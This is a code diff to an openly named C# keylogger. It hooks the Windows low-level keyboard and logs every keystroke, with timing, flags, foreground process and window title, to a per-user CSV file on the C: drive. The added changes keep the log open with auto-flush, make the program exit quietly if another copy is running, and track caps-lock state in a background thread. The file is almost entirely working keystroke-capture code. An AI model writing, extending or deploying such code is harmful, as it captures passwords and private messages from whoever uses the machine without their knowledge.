@@ -1,11 +1,10 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
 using System.Text;
 using System.Diagnostics;
 using System.IO;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
+using System.Threading;
 
 
 namespace dotnet_keylogger
@@ -13,8 +12,6 @@ namespace dotnet_keylogger
     class keylogger
     {
         private const int WH_KEYBOARD_LL = 13; // Low Level Keyboard Hook http://www.pinvoke.net/default.aspx/Enums.HookType
-        /// eliminate repeats
-        /// The previous key state (bit 30) can be used to determine whether the WM_SYSKEYDOWN message indicates the first down transition
         private const int WM_KEYUP = 0x0101; // Key down identifier https://docs.microsoft.com/en-us/windows/desktop/inputdev/wm-keyup
         private const int WM_KEYDOWN = 0x0100; // Key down identifier https://docs.microsoft.com/en-us/windows/desktop/inputdev/wm-keydown
         private const int WM_SYSKEYDOWN = 0x0104; // Alt key idnentifier https://docs.microsoft.com/en-us/windows/desktop/inputdev/wm-syskeydown
@@ -26,14 +23,7 @@ namespace dotnet_keylogger
         private static int lastFlags;
         private static int capslock = 0;
 
-        [Flags]
-        enum keyboard_hook_flags
-        {
-            Extended = 0x01,
-            Injected = 0x10,
-            AltPressed = 0x20,
-            Released = 0x80
-        };
+        private static StreamWriter sw;
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
@@ -62,11 +52,10 @@ namespace dotnet_keylogger
              * DWORD scanCode = Hardware scan code for the key
              * DWORD flags = 8 bit code describing various events
              *  bits of note:
-             *   0: Is it an extended key? Could potentially differentiate numpad keys from top of kb numbers
+             *   0: Is it an extended key? 
              *   1: If the key injection comes from a lower integirty process?
              *   4: Was the key injected?
              *   5: Is the ALT key down? Useless
-             *   6: Maybe nothing! maybe Previous state (1 if already down, else 0) https://docs.microsoft.com/en-us/windows/desktop/inputdev/wm-keydown
              *   7: Transition (0 if pressed, 1 if released)
              * DWORD time = timestamp equivelant to GetMessageTime
              * ULONG_PTR dwExtraInfo = Pointer to extra info
@@ -88,11 +77,12 @@ namespace dotnet_keylogger
                 }
                 int scanCode = Marshal.ReadInt32(lParam + 4);
                 int flags = Marshal.ReadInt32(lParam + 8);
+                /// Skip repeat messages if a key if its being held down
                 if (scanCode == lastScanCode && flags == lastFlags)
                 { return CallNextHookEx(_hookID, nCode, wParam, lParam); }
                 else
                 { lastScanCode = scanCode; lastFlags = flags; }
-                int test = flags >> 8;
+                /// 
                 int timestamp = Marshal.ReadInt32(lParam + 12);
                 if (currentTime.Year == 1)
                 {
@@ -100,12 +90,13 @@ namespace dotnet_keylogger
                 }
                 else
                 {
-                    if (timestamp < lastMsgTime) {diff = (timestamp + (2147483647 - lastMsgTime)); } //long max
+                    if (timestamp < lastMsgTime) {diff = (timestamp + (2147483647 - lastMsgTime)); } //long max wrap
                     else { diff = timestamp - lastMsgTime; }
                     currentTime = currentTime.AddMilliseconds(diff);
                 }
                 lastMsgTime = timestamp;
                 string windowTitle = GetActiveWindowTitle();
+                string windowName = GetActiveWindowName();
                 string[] elements = {
                     currentTime.ToLongDateString(),
                     (currentTime.ToLongTimeString() + ":" + currentTime.Millisecond.ToString("D3")),
@@ -113,15 +104,22 @@ namespace dotnet_keylogger
                     flags.ToString(),
                     diff.ToString("D3"),
                     ((Keys)vkCode).ToString(),
-                    windowTitle
+                    windowTitle,
+                    windowName
                 };
                 string line = string.Join(",", elements);
-                // Console.WriteLine(line);
-                StreamWriter sw = new StreamWriter(@"C:\keylog_" + currentTime.ToString("yyyy-MM-dd")+@".csv", true);
                 sw.Write(line + "\r\n");
-                sw.Close();
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+
+        private static string GetActiveWindowName()
+        {
+            const int nChars = 256;
+            StringBuilder Buff = new StringBuilder(nChars);
+            IntPtr handle = GetForegroundWindow();
+            GetWindowText(handle, Buff, nChars);
+            return Buff.ToString();
         }
 
         private static string GetActiveWindowTitle()
@@ -129,18 +127,37 @@ namespace dotnet_keylogger
             const int nChars = 256;
             StringBuilder Buff = new StringBuilder(nChars);
             IntPtr handle = GetForegroundWindow();
-            // int pID;
             GetWindowThreadProcessId(handle, out int pID);
             return Process.GetProcessById(pID).ProcessName;
         }
+
+        private static void TrackCapsLock()
+        {
+            while (true)
+            {
+                int temp = (int)GetKeyState(VirtualKeyStates.VK_CAPITAL);
+                if (temp == -128 || temp == -127) { continue; } /// If depressed right now, skip
+                capslock = temp;
+                Thread.Sleep(100);
+            }
+        }
+
         public static void Main ()
             {
-            capslock = (int)GetKeyState(VirtualKeyStates.VK_CAPITAL);
+            string pname = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
+            Process[] p = Process.GetProcessesByName(pname);
+            if (p.Length > 1)
+                Environment.Exit(0); /// already running, time to go bye bye
+            sw = new StreamWriter(@"C:\keylog_" + pname + "--" + Environment.UserName + @".csv", true);
+            sw.AutoFlush = true;
+            Thread thread_capslock_track = new Thread( new ThreadStart(TrackCapsLock));
+            thread_capslock_track.Start();
             _hookID = SetHook(_hook_callback_pointer);
             Application.Run();
             UnhookWindowsHookEx(_hookID);
-            }
-
+            sw.Flush();
+            sw.Close();
+        }
 
         [DllImport("user32.dll")]
         static extern IntPtr GetForegroundWindow();
